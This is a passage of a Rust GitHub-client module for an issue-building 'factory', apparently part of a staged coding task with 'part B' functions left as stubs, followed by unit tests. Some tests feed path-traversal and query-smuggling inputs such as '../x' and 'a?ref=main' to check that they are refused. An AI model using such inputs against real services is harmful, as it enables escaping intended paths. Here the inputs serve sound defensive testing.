    pub created_at: String,
    #[serde(default)]
    pub actor: Option<Actor>,
    pub label: LabelName,
}

/// A title renamed. Only who and when are asked for, never the titles.
#[derive(Clone, Debug, PartialEq, Eq, serde::Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct Rename {
    pub created_at: String,
    #[serde(default)]
    pub actor: Option<Actor>,
}

/// One label event or title rename; a node of any other type is an answer this module cannot
/// read.
#[derive(Clone, Debug, PartialEq, Eq, serde::Deserialize)]
#[serde(tag = "__typename")]
pub enum TimelineNode {
    LabeledEvent(LabelChange),
    UnlabeledEvent(LabelChange),
    RenamedTitleEvent(Rename),
}

impl TimelineNode {
    fn created_at(&self) -> &str {
        match self {
            TimelineNode::LabeledEvent(change) | TimelineNode::UnlabeledEvent(change) => {
                &change.created_at
            }
            TimelineNode::RenamedTitleEvent(rename) => &rename.created_at,
        }
    }
}

/// The timeline page: the newest events, oldest first, with GitHub's count of all of them.
#[derive(Clone, Debug, PartialEq, Eq, serde::Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct Timeline {
    pub total_count: u64,
    pub nodes: Vec<TimelineNode>,
}

/// GitHub's answer about an issue's label events and edit history.
#[derive(Clone, Debug, PartialEq, Eq, serde::Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct ApprovalIssue {
    pub timeline_items: Timeline,
    #[serde(default)]
    pub last_edited_at: Option<String>,
    #[serde(default)]
    pub editor: Option<Actor>,
    pub user_content_edits: EditHistory,
}

#[derive(serde::Deserialize)]
struct ApprovalAnswer {
    data: ApprovalData,
}

#[derive(serde::Deserialize)]
struct ApprovalData {
    repository: ApprovalRepository,
}

#[derive(serde::Deserialize)]
struct ApprovalRepository {
    issue: ApprovalIssue,
}

/// An instructor who is a person: GitHub says the actor is a `User`. A GitHub App's GraphQL
/// login can lack the `[bot]` suffix, so a login that matches an instructor is not enough.
pub fn is_human_instructor(actor: Option<&Actor>, instructors: &[String]) -> bool {
    actor.is_some_and(|actor| {
        actor.typename.as_deref() == Some("User") && is_instructor(Some(&actor.login), instructors)
    })
}

/// Whether a page may leave out older entries: it is full, or GitHub counts more than it holds.
fn is_cut_off(total_count: u64, shown: usize) -> bool {
    shown >= HISTORY_PAGE || total_count > shown as u64
}

/// Whether the timeline page shows every event at or after `since`: not cut off, or its oldest
/// is before `since`.
pub fn timeline_reaches(issue: &ApprovalIssue, since: &str) -> bool {
    let _ = (issue, since);
    todo!("part B")
}

/// Whether the newest history entry is the last edit, by the last editor.
fn newest_is_last_edit(
    edits: &EditHistory,
    last_edited_at: Option<&str>,
    editor: Option<&Actor>,
) -> bool {
    let _ = (edits, last_edited_at, editor);
    todo!("part B")
}

/// Judges every body edit and title rename with time at or after `since`. A moment in the same
/// second counts as after, because timestamps have no finer order. `reaches` says the renames
/// on the timeline page cover everything at or after `since`.
pub fn text_changes_since(
    issue: &ApprovalIssue,
    since: &str,
    instructors: &[String],
    reaches: bool,
) -> TextCheck {
    let _ = (issue, since, instructors, reaches);
    todo!("part B")
}

/// Whether the factory may build the issue: an instructor (only ever a `User`) applied the
/// `ready` label in force now, and every body edit and title rename from that second on was an
/// instructor's. Only the newest timeline page is read: it holds the label in force and all
/// after it, and a full page without it is `label-history-incomplete`. Label names match
/// exactly; times compare as text.
pub fn judge_approval(issue: &ApprovalIssue, ready: &str, instructors: &[String]) -> Approval {
    let _ = (issue, ready, instructors, Refusal::LabelNotFound);
    todo!("part B")
}

/// Whether anyone, an instructor included, edited the body or renamed the title at or after
/// `since`. A timeline page that may hide a rename at or after the moment counts as a change.
pub fn edited_since(issue: &ApprovalIssue, since: &str) -> bool {
    let _ = (issue, since);
    todo!("part B")
}

/// An instructor's comment made during a build.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct Comment {
    pub id: String,
    pub author: String,
    pub created_at: String,
    pub body: String,
}

/// An instructor's edit of the issue body: when, by whom, and the whole body as it stands now.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct BodyEdit {
    pub edited_at: String,
    pub editor: String,
    pub body: String,
}

/// Why an instructor's comment was not forwarded.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum DropReason {
    EditedByOther,
    Unverifiable,
}

/// An instructor's comment that was not forwarded because its text may not be the
/// instructor's.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct Dropped {
    pub id: String,
    pub reason: DropReason,
}

/// What the instructors did on an issue since a moment.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct Activity {
    /// Oldest first.
    pub comments: Vec<Comment>,
    pub body_edit: Option<BodyEdit>,
    pub dropped: Vec<Dropped>,
}

/// Where a piece of feedback was written. `state` is GitHub's review state.
#[derive(Clone, Debug, PartialEq, Eq)]
pub enum FeedbackKind {
    Review { state: String },
    PrComment,
    IssueComment,
}

/// A comment a review left on a line of the pull request's diff.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct InlineComment {
    pub path: String,
    /// The line it is on, or was on when the diff changed; `None` when GitHub gives neither.
    pub line: Option<u64>,
    pub body: String,
}

/// One piece of instructor feedback: a review of a pull request, or a comment on it.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct Feedback {
    /// `review:<id>`, `pr-comment:<id>` or `issue-comment:<id>`, so the id spaces cannot
    /// collide.
    pub id: String,
    pub author: String,
    pub kind: FeedbackKind,
    /// GitHub's UTC form, e.g. `2026-10-04T10:13:16Z`.
    pub created_at: String,
    /// The review's body or the comment's text; empty when there is none.
    pub body: String,
    /// The comments a review left on lines of the diff, in GitHub's order; empty for any other
    /// kind.
    pub inline: Vec<InlineComment>,
    /// How many inline comments of a review were not read; 0 for any other kind.
    pub inline_unread: u64,
}

/// Whether an instructor applied the `factory:ready` label in force, and every edit and
/// rename since was an instructor's.
pub fn approval<G: Tracker + ?Sized>(
    gh: &G,
    repo: &str,
    issue: u64,
    instructors: &[String],
) -> Result<Approval, TrackerError> {
    let _ = (gh, repo, issue, instructors, issue_query_args, quoted);
    todo!("part B")
}

/// Whether the issue text is as an instructor left it at `since`.
pub fn text_check<G: Tracker + ?Sized>(
    gh: &G,
    repo: &str,
    issue: u64,
    since: &str,
    instructors: &[String],
) -> Result<TextCheck, TrackerError> {
    let _ = (gh, repo, issue, since, instructors);
    todo!("part B")
}

/// Whether anyone edited the body or renamed the title at or after `since`.
pub fn text_edited_since<G: Tracker + ?Sized>(
    gh: &G,
    repo: &str,
    issue: u64,
    since: &str,
) -> Result<bool, TrackerError> {
    let _ = (gh, repo, issue, since);
    todo!("part B")
}

/// What the instructors wrote on the issue after `since`.
pub fn activity_since<G: Tracker + ?Sized>(
    gh: &G,
    repo: &str,
    issue: u64,
    since: &str,
    instructors: &[String],
) -> Result<Activity, TrackerError> {
    let _ = (gh, repo, issue, since, instructors);
    todo!("part B")
}

/// The instructors' feedback on pull request `pr` after `since`, reading back no further than
/// `floor`.
pub fn pr_feedback<G: Tracker + ?Sized>(
    gh: &G,
    repo: &str,
    pr: u64,
    since: &str,
    floor: &str,
    instructors: &[String],
) -> Result<Vec<Feedback>, TrackerError> {
    let _ = (gh, repo, pr, since, floor, instructors);
    todo!("part B")
}

// ---------------------------------------------------------------------------------------------
// End of part B.
// ---------------------------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;
    use crate::factory::github::{Answer, FakeTracker};

    fn args(parts: &[&str]) -> Vec<String> {
        parts.iter().map(|part| part.to_string()).collect()
    }

    #[test]
    fn pages_split_correctly_around_brackets_and_quotes_inside_strings() {
        let pages = "[{\"id\":1,\"body\":\"] [ } \\\" {\"}]\n[{\"id\":3,\"body\":\"s\"}]";
        assert_eq!(
            split_json_values(pages),
            vec![
                "[{\"id\":1,\"body\":\"] [ } \\\" {\"}]",
                "[{\"id\":3,\"body\":\"s\"}]"
            ]
        );
        #[derive(serde::Deserialize)]
        struct Row {
            id: u64,
        }
        let fake = FakeTracker::answering([Answer::ok(pages)]);
        let rows: Vec<Row> = gh_pages(&fake, &args(&["api", "x", "--paginate"]), "rows").unwrap();
        assert_eq!(rows.iter().map(|r| r.id).collect::<Vec<_>>(), vec![1, 3]);
    }

    #[test]
    fn empty_paginated_output_is_a_parse_error() {
        #[derive(Debug, serde::Deserialize)]
        struct Row {}
        let fake = FakeTracker::answering([Answer::ok(" \n")]);
        let error =
            gh_pages::<Row, _>(&fake, &args(&["api", "x"]), "JSON arrays of rows").unwrap_err();
        assert_eq!(
            error.to_string(),
            "`gh api x` returned unexpected output: JSON arrays of rows (output was empty)"
        );
    }

    #[test]
    fn a_utc_second_is_exactly_yyyy_mm_dd_thh_mm_ssz() {
        for good in ["2026-10-04T10:13:16Z", "0000-00-00T00:00:00Z"] {
            assert!(is_utc_second(good), "{good}");
        }
        for bad in [
            "2026-10-04T10:13:16.000Z",
            "2026-10-04T10:13:16+00:00",
            "2026-10-04 10:13:16Z",
            "2026-10-04T10:13:16z",
            "2026-1-04T10:13:16Z",
            "",
            "2026-10-04T10:13:1٦Z",
        ] {
            assert!(!is_utc_second(bad), "{bad}");
        }
    }

    #[test]
    fn a_graphql_call_for_a_repo_that_is_not_owner_name_is_a_parse_error() {
        assert_eq!(
            issue_query_args("softfac", "query", 6)
                .unwrap_err()
                .to_string(),
            "`gh api graphql` returned unexpected output: a repo written as owner/name, got `softfac`"
        );
        assert_eq!(
            issue_query_args("rawphp/softfac", "q", 6).unwrap(),
            args(&[
                "api",
                "graphql",
                "-f",
                "query=q",
                "-f",
                "owner=rawphp",
                "-f",
                "name=softfac",
                "-F",
                "number=6"
            ])
        );
    }

    // ----- Part A tests -----

    const REPO: &str = "rawphp/softfac";
    const BASE_SHA: &str = "9f8e7d6c5b4a39281706f5e4d3c2b1a098765432";
    const FILE_SHA: &str = BASE_SHA;
    const CONFIG_TEXT: &str = "factory:\n  instructors: [tomkaczocha]\n  base: main\n";
    const CONFIG_B64: &str =
        "ZmFjdG9yeToKICBpbnN0cnVjdG9yczogW3RvbWthY3pvY2hhXQogIGJhc2U6IG1haW4K\n";
    const HEAD_SHA: &str = "4f1c2d3e4a5b60718293a4b5c6d7e8f901234567";

    fn is_parse(error: &TrackerError) -> bool {
        matches!(error, TrackerError::Other(m) if m.contains("returned unexpected output"))
    }

    fn is_refused(error: &TrackerError) -> bool {
        matches!(error, TrackerError::Other(m)
            if m.contains("before calling gh") && !m.contains("unexpected output"))
    }

    fn is_failed(error: &TrackerError) -> bool {
        matches!(error, TrackerError::Other(m) if m.contains("exited with status"))
    }

    fn ref_reply(sha: &str) -> String {
        format!(
            "{{\"ref\":\"refs/heads/main\",\"node_id\":\"REF_x\",\"url\":\"https://api.github.com/repos/rawphp/softfac/git/refs/heads/main\",\"object\":{{\"sha\":\"{sha}\",\"type\":\"commit\",\"url\":\"https://api.github.com/repos/rawphp/softfac/git/commits/{sha}\"}}}}"
        )
    }

    fn file_reply(kind: &str, encoding: &str, size: u64, content: &str) -> String {
        serde_json::json!({
            "name": "config.yml",
            "path": ".dw/config.yml",
            "sha": "abc",
            "size": size,
            "url": "https://api.github.com/repos/rawphp/softfac/contents/.dw/config.yml?ref=main",
            "type": kind,
            "content": content,
            "encoding": encoding,
            "_links": {"self": "x"},
        })
        .to_string()
    }

    fn encode_base64(bytes: &[u8]) -> String {
        const TABLE: &[u8; 64] =
            b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
        let mut out = String::new();
        for chunk in bytes.chunks(3) {
            let n = chunk
                .iter()
                .enumerate()
                .fold(0u32, |n, (i, b)| n | (u32::from(*b) << (16 - 8 * i)));
            for i in 0..4 {
                if i <= chunk.len() {
                    out.push(TABLE[((n >> (18 - 6 * i)) & 63) as usize] as char);
                } else {
                    out.push('=');
                }
            }
        }
        out
    }

    #[test]
    fn branch_tip_reads_the_full_commit_id_of_the_branch_with_the_exact_call() {
        let fake = FakeTracker::answering([Answer::ok(ref_reply(BASE_SHA))]);
        assert_eq!(branch_tip(&fake, REPO, "main").unwrap(), BASE_SHA);
        assert_eq!(
            fake.calls(),
            vec![args(&["api", "repos/rawphp/softfac/git/ref/heads/main"])]
        );
    }

    #[test]
    fn branch_tip_keeps_slashes_in_the_branch_and_encodes_everything_else() {
        let fake = FakeTracker::answering([
            Answer::ok(ref_reply(BASE_SHA)),
            Answer::ok(ref_reply(BASE_SHA)),
        ]);
        branch_tip(&fake, REPO, "release/1.0").unwrap();
        branch_tip(&fake, REPO, "a b?c#d%e").unwrap();
        let calls = fake.calls();
        assert_eq!(
            calls[0][1],
            "repos/rawphp/softfac/git/ref/heads/release/1.0"
        );
        assert_eq!(
            calls[1][1],
            "repos/rawphp/softfac/git/ref/heads/a%20b%3Fc%23d%25e"
        );
    }

    #[test]
    fn branch_tip_refuses_an_answer_that_is_not_a_commit_id_or_not_a_commit() {
        let tag = ref_reply(&BASE_SHA.to_uppercase()).replace("commit", "tag");
        for answer in [
            ref_reply("main"),
            ref_reply("9f8e7d6c5b4a3928"),
            tag,
            "{\"object\":{\"type\":\"commit\"}}".to_string(),
            "[]".to_string(),
            "not json".to_string(),
        ] {
            let fake = FakeTracker::answering([Answer::ok(answer.clone())]);
            let error = branch_tip(&fake, REPO, "main").unwrap_err();
            assert!(is_parse(&error), "{answer}: {error}");
        }
    }

    #[test]
    fn branch_tip_accepts_a_64_digit_id() {
        let sha = "a".repeat(64);
        let fake = FakeTracker::answering([Answer::ok(ref_reply(&sha))]);
        assert_eq!(branch_tip(&fake, REPO, "main").unwrap(), sha);
    }

    #[test]
    fn branch_tip_refuses_a_branch_name_that_could_leave_the_refs_path_with_no_call() {
        for branch in ["", "..", "../x", "a/../b", "./x", "/x", "x//y", "x/"] {
            let fake = FakeTracker::answering([Answer::ok(ref_reply(BASE_SHA))]);
            let error = branch_tip(&fake, REPO, branch).unwrap_err();
            assert!(is_refused(&error), "{branch}: {error}");
            assert!(fake.calls().is_empty(), "{branch}");
        }
    }

    #[test]
    fn branch_tip_of_a_branch_that_is_not_there_is_the_gh_failure() {
        let fake = FakeTracker::answering([Answer::fail(1, "gh: Not Found (HTTP 404)")]);
        let error = branch_tip(&fake, REPO, "gone").unwrap_err();
        assert!(matches!(error, TrackerError::NotFound { .. }), "{error}");
    }

    #[test]
    fn default_branch_reads_the_repo_from_the_api_with_the_exact_call() {
        let fake = FakeTracker::answering([Answer::ok(
            "{\"id\":1,\"name\":\"softfac\",\"full_name\":\"rawphp/softfac\",\"default_branch\":\"main\",\"private\":true}",
        )]);
        assert_eq!(default_branch(&fake, REPO).unwrap(), "main");
        assert_eq!(fake.calls(), vec![args(&["api", "repos/rawphp/softfac"])]);
    }

    #[test]
    fn default_branch_refuses_an_answer_without_one() {
        for answer in [
            "{\"name\":\"softfac\"}",
            "{\"default_branch\":\"\"}",
            "{\"default_branch\":null}",
            "[]",
            "no",
        ] {
            let fake = FakeTracker::answering([Answer::ok(answer)]);
            let error = default_branch(&fake, REPO).unwrap_err();
            assert!(is_parse(&error), "{answer}: {error}");
        }
    }

    #[test]
    fn file_at_reads_a_file_at_a_commit_with_the_exact_call_and_decodes_it() {
        let fake =
            FakeTracker::answering([Answer::ok(file_reply("file", "base64", 51, CONFIG_B64))]);
        assert_eq!(
            file_at(&fake, REPO, ".dw/config.yml", FILE_SHA).unwrap(),
            CONFIG_TEXT
        );
        assert_eq!(
            fake.calls(),
            vec![args(&[
                "api",
                &format!("repos/rawphp/softfac/contents/.dw/config.yml?ref={FILE_SHA}")
            ])]
        );
    }

    #[test]
    fn file_at_decodes_content_wrapped_over_several_lines_and_padded() {
        let b64 = "YWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFh\nYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYQo=\n";
        let fake = FakeTracker::answering([Answer::ok(file_reply("file", "base64", 101, b64))]);
        assert_eq!(
            file_at(&fake, REPO, ".dw/config.yml", FILE_SHA).unwrap(),
            format!("{}\n", "a".repeat(100))
        );
    }

    #[test]
    fn file_at_refuses_a_file_over_the_size_cap_even_when_its_content_is_whole() {
        // The size check must refuse it on its own: the content matches the stated size.
        let size = MAX_FILE_BYTES + 1;
        let content = encode_base64("a".repeat(size as usize).as_bytes());
        let fake =
            FakeTracker::answering([Answer::ok(file_reply("file", "base64", size, &content))]);
        let error = file_at(&fake, REPO, ".dw/config.yml", FILE_SHA).unwrap_err();
        assert!(is_parse(&error), "{error}");
        assert!(error.to_string().contains("it is too big"), "{error}");
    }

    #[test]
    fn file_at_refuses_what_is_not_a_plain_complete_file() {
        for answer in [
            // A directory is a JSON array.
            "[{\"type\":\"file\",\"name\":\"config.yml\"}]".to_string(),
            file_reply("symlink", "base64", 51, CONFIG_B64),
            file_reply("submodule", "base64", 51, CONFIG_B64),
            // A file over 1 MB comes with no content and the encoding `none`.
            file_reply("file", "none", 2_000_000, ""),
            // Under the size cap, but the content is not base64 even though it reads like it.
            file_reply("file", "none", 51, CONFIG_B64),
            file_reply("file", "utf-8", 51, CONFIG_B64),
            // The size says more than the content holds: truncated.
            file_reply("file", "base64", 5_000, CONFIG_B64),
            file_reply("file", "base64", 10, CONFIG_B64),
            // Over the size this reader accepts, whatever the content says.
            file_reply("file", "base64", MAX_FILE_BYTES + 1, CONFIG_B64),
            // Not base64, not UTF-8.
            file_reply("file", "base64", 51, "!!!not base64!!!"),
            file_reply("file", "base64", 3, "//4K\n"),
            "not json".to_string(),
        ] {
            let fake = FakeTracker::answering([Answer::ok(answer.clone())]);
            let error = file_at(&fake, REPO, ".dw/config.yml", FILE_SHA).unwrap_err();
            assert!(is_parse(&error), "{answer}: {error}");
        }
    }

    #[test]
    fn file_at_refuses_base64_whose_padding_does_not_fit_its_length() {
        // `YQ==` is "a" and `YWI=` is "ab". One `=` after two characters, or two after three,
        // is not base64.
        for (b64, size) in [("YQ=", 1), ("YWI==", 2), ("YQ", 1), ("YQ==YQ==", 2)] {
            let fake =
                FakeTracker::answering([Answer::ok(file_reply("file", "base64", size, b64))]);
            let error = file_at(&fake, REPO, ".dw/config.yml", FILE_SHA).unwrap_err();
            assert!(is_parse(&error), "{b64}: {error}");
        }
        for (b64, want) in [("YQ==", "a"), ("YWI=", "ab")] {
            let fake = FakeTracker::answering([Answer::ok(file_reply(
                "file",
                "base64",
                want.len() as u64,
                b64,
            ))]);
            assert_eq!(
                file_at(&fake, REPO, ".dw/config.yml", FILE_SHA).unwrap(),
                want
            );
        }
    }

    #[test]
    fn file_at_makes_no_call_for_a_ref_that_is_not_a_full_commit_id_or_a_path_that_could_leave() {
        for (path, sha) in [
            (".dw/config.yml", "main"),
            (".dw/config.yml", "9f8e7d6c"),
            (".dw/config.yml", "9f8e7d6c5b4a39281706f5e4d3c2b1a09876543g"),
            ("../x", FILE_SHA),
            ("a//b", FILE_SHA),
            ("", FILE_SHA),
            ("a b", FILE_SHA),
            ("a?ref=main", FILE_SHA),
        ] {
            let fake =
                FakeTracker::answering([Answer::ok(file_reply("file", "base64", 51, CONFIG_B64))]);
            let error = file_at(&fake, REPO, path, sha).unwrap_err();
            assert!(is_refused(&error), "{path} {sha}: {error}");
            assert!(fake.calls().is_empty(), "{path} {sha}");
        }
    }

    #[test]
    fn file_at_of_a_file_that_is_not_there_is_the_gh_failure() {
        let fake = FakeTracker::answering([Answer::fail(1, "gh: Not Found (HTTP 404)")]);
        let error = file_at(&fake, REPO, ".dw/config.yml", FILE_SHA).unwrap_err();
        assert!(matches!(error, TrackerError::NotFound { .. }), "{error}");
    }

    // The listings and one issue.

    const LIST_ONE: &str = "[{\"assignees\":[{\"id\":\"MDQ6VXNlcjE=\",\"login\":\"rawphp\",\"name\":\"Tom\"}],\"labels\":[{\"id\":\"LA_1\",\"name\":\"factory:needs-info\",\"description\":\"d\",\"color\":\"d93f0b\"}],\"number\":6,\"title\":\"GitHub client\"}]";
    const LIST_MANY: &str = "[{\"assignees\":[],\"labels\":[],\"number\":6,\"title\":\"GitHub client\"},{\"assignees\":[{\"login\":\"a\"},{\"login\":\"b\"}],\"labels\":[{\"name\":\"factory:ready\"},{\"name\":\"Postponed\"}],\"number\":9,\"title\":\"Daemon loop\"}]";
    const ISSUE_VIEW: &str = "{\"assignees\":[{\"login\":\"rawphp\"}],\"author\":{\"id\":\"MDQ6VXNlcjE=\",\"is_bot\":false,\"login\":\"tomkaczocha\",\"name\":\"Tom\"},\"body\":\"Build the runner.\\n\\n- one\\n- two\",\"labels\":[{\"name\":\"factory:ready\"},{\"name\":\"phase:1\"}],\"number\":10,\"state\":\"OPEN\",\"title\":\"Build step\"}";

    fn listing_of(count: u64) -> String {
        let rows: Vec<String> = (1..=count)
            .rev()
            .map(|n| {
                format!("{{\"assignees\":[],\"labels\":[],\"number\":{n},\"title\":\"issue {n}\"}}")
            })
            .collect();
        format!("[{}]", rows.join(","))
    }

    fn issue_json(labels: &[&str], assignees: &[&str], body: &str) -> String {
        let assignees: Vec<String> = assignees
            .iter()
            .map(|n| format!("{{\"login\":\"{n}\"}}"))
            .collect();
        let labels: Vec<String> = labels
            .iter()
            .map(|n| format!("{{\"name\":\"{n}\"}}"))
            .collect();
        format!(
            "{{\"assignees\":[{}],\"author\":null,\"body\":{body},\"labels\":[{}],\"number\":10,\"state\":\"OPEN\",\"title\":\"Build step\"}}",
            assignees.join(","),
            labels.join(",")
        )
    }

    fn issue_view_call(number: &str) -> Vec<String> {
        args(&[
            "issue",
            "view",
            number,
            "--repo",
            REPO,
            "--json",
            "number,title,body,labels,assignees,state,author",
        ])
    }

    #[test]
    fn list_issues_with_none() {
        let fake = FakeTracker::answering([Answer::ok("[]")]);
        let issues = list_issues(&fake, REPO, State::Ready).unwrap();
        assert_eq!(
            issues,
            Listing {
                items: vec![],
                cut: false
            }
        );
        assert_eq!(
            fake.calls(),
            vec![args(&[
                "issue",
                "list",
                "--repo",
                REPO,
                "--state",
                "open",
                "--label",
                "factory:ready",
                "--limit",
                "201",
                "--json",
                "number,title,assignees,labels",
            ])]
        );
    }

    #[test]
    fn list_issues_with_one_ignores_unknown_fields() {
        let fake = FakeTracker::answering([Answer::ok(LIST_ONE)]);
        let issues = list_issues(&fake, REPO, State::NeedsInfo).unwrap();
        assert_eq!(
            issues.items,
            vec![IssueSummary {
                number: 6,
                title: "GitHub client".into(),
                assignees: vec!["rawphp".into()],
                labels: vec!["factory:needs-info".into()],
            }]
        );
        assert_eq!(fake.calls()[0][7], "factory:needs-info");
    }

    #[test]
    fn list_issues_with_several_carries_each_ones_label_names_or_none() {
        let fake = FakeTracker::answering([Answer::ok(LIST_MANY)]);
        let issues = list_issues(&fake, REPO, State::Ready).unwrap();
        assert_eq!(
            issues.items,
            vec![
                IssueSummary {
                    number: 6,
                    title: "GitHub client".into(),
                    assignees: vec![],
                    labels: vec![],
                },
                IssueSummary {
                    number: 9,
                    title: "Daemon loop".into(),
                    assignees: vec!["a".into(), "b".into()],
                    labels: vec!["factory:ready".into(), "Postponed".into()],
                },
            ]
        );
    }

    #[test]
    fn list_issues_past_the_limit_returns_the_first_200_and_says_it_was_cut() {
        assert_eq!(LIST_LIMIT, 200);
        let fake = FakeTracker::answering([Answer::ok(listing_of(201))]);
        let issues = list_issues(&fake, REPO, State::Ready).unwrap();
        assert!(issues.cut);
        assert_eq!(issues.items.len(), 200);
        assert_eq!(
            issues.items.iter().map(|i| i.number).collect::<Vec<_>>(),
            (2..=201).rev().collect::<Vec<u64>>()
        );
        assert_eq!(fake.calls()[0][9], "201");
    }

    #[test]
    fn list_issues_at_the_limit_returns_them_all_and_says_nothing() {
        let fake = FakeTracker::answering([Answer::ok(listing_of(200))]);
        let issues = list_issues(&fake, REPO, State::Ready).unwrap();
        assert!(!issues.cut);
        assert_eq!(issues.items.len(), 200);
    }

    #[test]
    fn malformed_json_is_a_parse_error_carrying_the_args() {
        let fake = FakeTracker::answering([Answer::ok("not json")]);
        let error = list_issues(&fake, REPO, State::Ready).unwrap_err();
        let message = error.to_string();
        assert!(is_parse(&error), "{message}");
        assert!(message.contains("JSON array of issues"), "{message}");
        assert!(message.contains("unexpected output"), "{message}");
        assert!(
            message.contains("gh issue list --repo rawphp/softfac"),
            "{message}"
        );
    }

    #[test]
    fn issue_reads_the_real_shape_with_the_exact_call() {
        let fake = FakeTracker::answering([Answer::ok(ISSUE_VIEW)]);
        let detail = issue(&fake, REPO, 10).unwrap();
        assert_eq!(fake.calls(), vec![issue_view_call("10")]);
        assert_eq!(
            detail,
            IssueDetail {
                number: 10,
                title: "Build step".into(),
                body: "Build the runner.\n\n- one\n- two".into(),
                labels: vec!["factory:ready".into(), "phase:1".into()],
                assignees: vec!["rawphp".into()],
                author: Some("tomkaczocha".into()),
                state: Some(State::Ready),
                closed: false,
            }
        );
    }

    #[test]
    fn issue_says_when_github_has_it_closed_and_keeps_its_factory_label() {
        let fake = FakeTracker::answering([Answer::ok(
            ISSUE_VIEW.replace("\"state\":\"OPEN\"", "\"state\":\"CLOSED\""),
        )]);
        let detail = issue(&fake, REPO, 10).unwrap();
        assert!(detail.closed);
        assert_eq!(detail.state, Some(State::Ready));
    }

    #[test]
    fn issue_author_is_null_when_gh_gives_null_or_nothing() {
        let without_author = {
            let start = ISSUE_VIEW.find("\"author\":{").unwrap();
            let end = start + ISSUE_VIEW[start..].find("},").unwrap() + 2;
            format!("{}{}", &ISSUE_VIEW[..start], &ISSUE_VIEW[end..])
        };
        let fake = FakeTracker::answering([
            Answer::ok(issue_json(&[], &[], "\"b\"")),
            Answer::ok(without_author),
        ]);
        assert_eq!(issue(&fake, REPO, 10).unwrap().author, None);
        assert_eq!(issue(&fake, REPO, 10).unwrap().author, None);
    }

    #[test]
    fn issue_state_is_null_with_no_factory_label() {
        let fake =
            FakeTracker::answering([Answer::ok(issue_json(&["phase:1", "bug"], &[], "\"b\""))]);
        let detail = issue(&fake, REPO, 10).unwrap();
        assert_eq!(detail.state, None);
        assert!(detail.assignees.is_empty());
    }

    #[test]
    fn issue_state_is_the_one_factory_label() {
        let fake = FakeTracker::answering([Answer::ok(issue_json(
            &["bug", "factory:needs-info"],
            &[],
            "\"b\"",
        ))]);
        assert_eq!(
            issue(&fake, REPO, 10).unwrap().state,
            Some(State::NeedsInfo)
        );
    }

    #[test]
    fn issue_state_is_null_with_two_factory_labels() {
        let fake = FakeTracker::answering([Answer::ok(issue_json(
            &["factory:ready", "factory:building"],
            &[],
            "\"b\"",
        ))]);
        assert_eq!(issue(&fake, REPO, 10).unwrap().state, None);
    }

    #[test]
    fn issue_state_is_null_for_an_unknown_factory_label() {
        let fake =
            FakeTracker::answering([Answer::ok(issue_json(&["factory:bogus"], &[], "\"b\""))]);
        assert_eq!(issue(&fake, REPO, 10).unwrap().state, None);
    }

    #[test]
    fn issue_state_is_null_with_a_bogus_and_a_real_factory_label_in_either_order() {
        for labels in [
            ["factory:bogus", "factory:ready"],
            ["factory:ready", "factory:bogus"],
        ] {
            let fake = FakeTracker::answering([Answer::ok(issue_json(&labels, &[], "\"b\""))]);
            assert_eq!(issue(&fake, REPO, 10).unwrap().state, None, "{labels:?}");
        }
    }

    #[test]
    fn issue_with_a_null_body_has_an_empty_body_and_keeps_every_assignee() {
        let fake = FakeTracker::answering([Answer::ok(issue_json(
            &["factory:ready"],
            &["a", "b"],
            "null",
        ))]);
        let detail = issue(&fake, REPO, 10).unwrap();
        assert_eq!(detail.body, "");
        assert_eq!(detail.assignees, vec!["a".to_string(), "b".to_string()]);
    }

    #[test]
    fn issue_errors_are_typed() {
        let failing = FakeTracker::answering([Answer::fail(1, "not found")]);
        let failed = issue(&failing, REPO, 10).unwrap_err();
        assert!(is_failed(&failed), "{failed}");
        assert!(failed.to_string().contains("status 1"), "{failed}");

        let wrong = FakeTracker::answering([Answer::ok("[]")]);
        assert!(is_parse(&issue(&wrong, REPO, 10).unwrap_err()));

        let null_assignees = FakeTracker::answering([Answer::ok("{\"assignees\":null}")]);
        assert!(is_parse(&issue(&null_assignees, REPO, 10).unwrap_err()));
    }

    #[test]
    fn issue_uses_the_number_it_is_given() {
        let fake =
            FakeTracker::answering([Answer::ok(issue_json(&["factory:ready"], &[], "\"b\""))]);
        issue(&fake, REPO, 7).unwrap();
        assert_eq!(fake.calls()[0][..3], args(&["issue", "view", "7"])[..]);
    }

    // Pull requests.

    const PR_VIEW: &str = "{\"createdAt\":\"2026-10-29T05:50:00Z\",\"baseRefName\":\"main\",\"headRefName\":\"t3code/2bb65018\",\"headRefOid\":\"4f1c2d3e4a5b60718293a4b5c6d7e8f901234567\",\"isCrossRepository\":false,\"isDraft\":true,\"mergeable\":\"MERGEABLE\",\"number\":2,\"state\":\"OPEN\"}";

    fn pr_view(state: &str, draft: bool) -> String {
        format!(
            "{{\"createdAt\":\"2026-10-29T05:50:00Z\",\"baseRefName\":\"main\",\"headRefName\":\"x\",\"headRefOid\":\"{HEAD_SHA}\",\"isCrossRepository\":false,\"isDraft\":{draft},\"mergeable\":\"MERGEABLE\",\"number\":9,\"state\":\"{state}\"}}"
        )
    }

    fn pr_view_call(number: &str) -> Vec<String> {
        args(&[
            "pr",
            "view",
            number,
            "--repo",
            REPO,
            "--json",
            "number,isDraft,state,headRefName,isCrossRepository,baseRefName,headRefOid,mergeable,createdAt",
        ])
    }

    #[test]
    fn pull_request_reads_the_real_shape_with_the_exact_call() {
        let fake = FakeTracker::answering([Answer::ok(PR_VIEW)]);
        let pr = pull_request(&fake, REPO, 2).unwrap();
        assert_eq!(fake.calls(), vec![pr_view_call("2")]);
        assert_eq!(
            pr,
            Some(PullRequest {
                number: 2,
                is_draft: true,
                open: true,
                merged: false,
                head_ref: "t3code/2bb65018".into(),
                cross_repository: false,
                base_ref: "main".into(),
